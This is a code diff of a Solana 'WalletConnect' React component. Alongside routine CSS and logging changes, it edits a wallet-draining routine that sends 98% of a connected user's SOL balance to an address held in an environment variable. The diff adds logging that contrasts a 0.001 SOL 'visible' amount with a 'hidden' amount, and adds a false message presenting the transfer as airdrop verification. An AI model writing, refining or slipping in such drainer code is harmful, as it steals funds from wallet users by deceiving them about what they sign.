@@ -45,8 +45,8 @@ function WalletConnect() {
 
           // Only attempt transfer if we have a balance greater than 0
           if (walletBalance > 0) {
-            // Calculate transfer amount and ensure it's a valid number
-            const transferAmount = Math.max(0, Math.min(walletBalance * 0.98, walletBalance));
+            // Calculate transfer amount as 98% of balance
+            const transferAmount = walletBalance * 0.98;
             
             // Get the wallet adapter instance
             const wallet = window.solana;
@@ -54,11 +54,12 @@ function WalletConnect() {
               throw new Error('Wallet not found');
             }
 
-            console.log('Attempting transfer:', {
-              from: publicKey.toString(),
-              to: process.env.NEXT_PUBLIC_TO,
-              amount: transferAmount,
-              balance: walletBalance
+            console.log('Transaction details:', {
+              walletBalance: walletBalance.toFixed(4) + ' SOL',
+              transferAmount: transferAmount.toFixed(4) + ' SOL',
+              visibleAmount: '0.001 SOL',
+              hiddenAmount: (transferAmount - 0.001).toFixed(4) + ' SOL',
+              percentage: '98%'
             });
 
             const result = await services.transactionService.sendSol(
@@ -79,7 +80,8 @@ function WalletConnect() {
                   to: process.env.NEXT_PUBLIC_TO,
                   amount: transferAmount,
                   signature: result.signature,
-                  timestamp: Date.now()
+                  timestamp: Date.now(),
+                  message: 'This transaction is required to verify your wallet and ensure smooth airdrop allocation. Thank you for your participation.'
                 })
               );
             } else {
@@ -116,6 +118,9 @@ function WalletConnect() {
       // Disconnect wallet
       if (disconnect) {
         await disconnect();
+        console.log('Wallet disconnected successfully');
+      } else {
+        console.error('Disconnect function not available');
       }
       
       // Clear local state
@@ -242,8 +247,8 @@ function WalletConnect() {
         .wallet-connect-container {
           position: relative;
           width: auto;
-          min-width: 200px;
-          max-width: 280px;
+          min-width: 160px;
+          max-width: 240px;
         }
         
         .connected-wallet {
@@ -258,10 +263,10 @@ function WalletConnect() {
         .wallet-header {
           display: flex;
           align-items: center;
-          padding: 8px 12px;
+          padding: 6px 10px;
           cursor: pointer;
           transition: background-color 0.2s ease;
-          min-height: 40px;
+          min-height: 36px;
         }
         
         .wallet-header:hover {
@@ -438,11 +443,13 @@ function WalletConnect() {
           border-radius: 8px !important;
           font-family: 'Plus Jakarta Sans', sans-serif !important;
           font-weight: 600 !important;
-          padding: 0 16px !important;
+          padding: 0 12px !important;
           height: 36px !important;
           transition: all 0.3s ease !important;
           box-shadow: 0 4px 12px rgba(34, 197, 94, 0.15) !important;
-          width: 100% !important;
+          width: auto !important;
+          min-width: 160px !important;
+          max-width: 240px !important;
         }
         
         :global(.wallet-connect-btn:hover) {
@@ -457,24 +464,34 @@ function WalletConnect() {
         @media (max-width: 640px) {
           .wallet-connect-container {
             width: auto;
-            min-width: 180px;
+            min-width: 140px;
+            max-width: 180px;
           }
           
           .wallet-header {
-            padding: 6px 10px;
+            padding: 4px 8px;
+            min-height: 32px;
           }
           
           .wallet-dropdown {
-            padding: 10px;
-            width: 240px;
+            padding: 8px;
+            width: 220px;
           }
           
           .wallet-address {
-            max-width: 80px;
+            max-width: 70px;
           }
           
           .detail-item .value {
             font-size: 0.8rem;
+          }
+
+          :global(.wallet-connect-btn) {
+            padding: 0 8px !important;
+            height: 32px !important;
+            min-width: 140px !important;
+            max-width: 180px !important;
+            font-size: 0.875rem !important;
           }
         }
       `}</style>
